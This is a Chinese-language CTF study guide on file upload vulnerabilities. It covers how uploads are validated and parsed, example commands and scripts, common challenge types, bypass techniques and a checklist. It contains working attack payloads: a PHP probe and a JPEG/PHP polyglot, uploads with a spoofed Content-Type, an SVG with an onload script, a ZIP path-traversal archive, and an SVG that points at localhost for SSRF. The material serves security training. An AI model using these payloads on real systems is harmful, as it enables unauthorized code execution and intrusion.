# 文件上传

## 原理
文件上传漏洞的危险不在“能上传文件”本身，而在上传后的文件如何被命名、存储、解析、二次处理与对外暴露。一个上传点从浏览器到最终落地通常会经历前端校验、后端扩展名检查、MIME 检查、魔数检查、重命名、缩略图或转码、解压预处理、对象存储同步、Web 服务器解析和访问控制等多个环节，任何一个环节的错误都可能让攻击者把可执行代码、恶意模板、压缩包、SVG、Office/PDF、图片马、路径穿越文件送进危险位置。CTF 最常见的目标是上传可执行探针、通过解析差异执行代码、借处理链打到 SSRF/XXE/RCE，或者利用文件名与路径控制实现覆盖与目录穿越。

分析上传题时，要先确认四个事实：第一，服务端真正依据什么做判定，是前端 JavaScript、扩展名、`Content-Type`、文件头还是图像库解码结果；第二，文件最终保存在哪个目录，是否能被 Web 直接访问；第三，访问时是否会经过 PHP/ASP/JSP 等解释器或模板系统；第四，上传后是否还有异步处理链，例如解压、裁剪、OCR、PDF/Office 预览、杀毒、缩略图、媒体转码。很多题并非直接允许 `.php`，而是故意设计双扩展名、大小写、Nginx/Apache 解析差异、图片马、ZIP 解压、SVG 外链、文件名注入等方式，需要沿着完整链路去验证。

## 工具与命令示例
```bash
# 1) 构造最简单的 PHP 解析探针，验证服务器是否把文件当脚本执行
python -c "open('probe.php','w').write('<?php phpinfo(); ?>')"

# 2) 构造 JPEG + PHP polyglot，前 4 字节保留 JPEG 头
python -c "open('probe.jpg','wb').write(bytes.fromhex('ffd8ffe0')+b'<?php phpinfo(); ?>')"

# 3) 用 curl 指定伪造的 Content-Type 上传
curl -F "file=@probe.php;type=image/jpeg" http://target/upload.php

# 4) 测试双扩展名与大小写后缀
curl -F "file=@probe.php;filename=probe.pHp.jpg" http://target/upload.php

# 5) 生成恶意 SVG，适合走 SVG 预览、存储型 XSS、二次 SSRF
python -c "open('x.svg','w').write('<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch(`/flag`).then(r=>r.text()).then(alert)\"></svg>')"

# 6) 检查文件类型与魔数，确认伪装是否生效
file probe.jpg

# 7) 用 exiftool 写入注释，有些处理链会把注释回显到页面
exiftool -Comment='ctf-upload-probe' probe.jpg

# 8) 构造 ZIP 题常用测试包
powershell -Command "Compress-Archive -Path .\payload\* -DestinationPath upload.zip -Force"
```

## 常见 CTF 题型
### 题型一：后端只检查 MIME 或前端校验
思路：很多题前端限制扩展名，后端只看 `Content-Type` 或根本不看。直接抓包改文件名、MIME 即可上传脚本探针，随后访问上传路径验证是否执行。

```python
import requests
files = {'file': ('probe.phtml', open('probe.php','rb'), 'image/jpeg')}
r = requests.post('http://target/upload.php', files=files)
print(r.text)
```

### 题型二：双扩展名/解析差异
思路：服务端允许 `.jpg`，但 Web 服务器会把 `.php.jpg`、`.phtml`、`.php5` 当作脚本解析，或某些错误配置会按第一个后缀决定处理器。此类题要先搞清 Nginx/Apache/PHP-FPM 配置，再枚举可能被执行的变体。

```python
candidates = [
    'probe.php.jpg', 'probe.phtml', 'probe.php5',
    'probe.phar', 'probe.pHp', 'probe.php%00.jpg'
]
for name in candidates:
    print(name)
```

### 题型三：ZIP 上传与目录穿越
思路：目标接收压缩包后解压到 Web 根、临时目录或用户目录，若未正确规范化路径，就可能通过 `../` 写到任意位置。某些题还会结合软链接、覆盖已有模板、覆盖计划任务文件。

```python
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../../wwwroot/probe.php', '<?php phpinfo(); ?>')
```

### 题型四：SVG/Office/PDF 预览链
思路：上传的不是脚本，而是会被后端渲染、截图、OCR、转 PDF 的富文档格式，利用点可能是存储型 XSS、XXE、SSRF、ImageMagick/Ghostscript RCE，而非直接执行。

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://127.0.0.1:8080/admin" />
</svg>
```

## 绕过与进阶技巧
- **前端校验无意义**：前端只负责提示，真正决定权在服务端，抓包改文件名/MIME 是最先验证的动作。
- **扩展名绕过**：双扩展名、大小写混写、尾随点、特殊分隔符、备用扩展如 `.phtml/.php5/.phar/.asa/.jspx`。
- **MIME 绕过**：直接改 `Content-Type`，很多应用只看请求头不验内容。
- **魔数绕过**：在文件头塞入合法图片标识，再拼接脚本或恶意内容，形成 polyglot。
- **文件名注入**：文件名进入模板、命令、日志、数据库或响应头时，可能引出 XSS、命令注入、路径穿越和 CRLF。
- **解压链风险**：ZIP Slip、tar 路径穿越、软链接、相对路径覆盖是高频 CTF 设计点。
- **处理器差异**：Apache、Nginx、IIS、Tomcat 对扩展名、路径信息、默认文档的解释方式不同，必须结合实际运行时验证。
- **对象存储场景**：若最终只存到 OSS/S3 且永不解释执行，传统思路不成立，应转向存储型 XSS、恶意文件外链、预览链攻击。
- **异步任务**：缩略图、转码、OCR、杀毒引擎是常见第二战场，很多高价值利用点出现在上传完成之后。

## 快速检查清单
- [ ] 服务端真正检查的是扩展名、MIME、魔数还是图像解码结果
- [ ] 上传后文件真实保存路径与访问 URL 是否可预测
- [ ] 目标目录是否位于可执行/可解析的 Web 根下
- [ ] 是否测试过 `.phtml/.php5/.phar`、双扩展名、大小写混写等变体
- [ ] 是否仅靠修改 `Content-Type` 就能通过校验
- [ ] 是否存在压缩包解压、缩略图、转码、OCR、预览等异步处理链
- [ ] 文件名是否可控并参与命令、模板、路径或响应头拼接
- [ ] 对象存储或 CDN 场景下，是否应转向 XSS/SSRF/XXE 而非直接执行
- [ ] 服务器和解释器的扩展名解析规则是否已被实际验证
- [ ] 是否已确认最短得分路径：直接执行、覆盖模板，还是打二次处理链
